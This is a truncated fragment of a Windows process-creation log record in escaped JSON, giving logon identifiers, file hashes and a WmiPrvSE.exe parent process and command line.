Williams"",""logonGuid"":""{df9fc3d3-d0d4-5ec7-0000-002021020300}"",""logonId"":""0x30221"",""terminalSessionId"":""1"",""integrityLevel"":""Medium"",""hashes"":""MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481"",""parentProcessGuid"":""{df9fc3d3-d0e3-5ec7-0000-00107c1d0700}"",""parentProcessId"":""5700"",""parentImage"":""C:\\\\Windows\\\\System32\\\\wbem\\\\WmiPrvSE.exe"",""parentCommandLine"":""C:\\\\Windows\\\\system32\\\\wbem\\\\wmiprvse.exe -secured -Embedding""}}}"
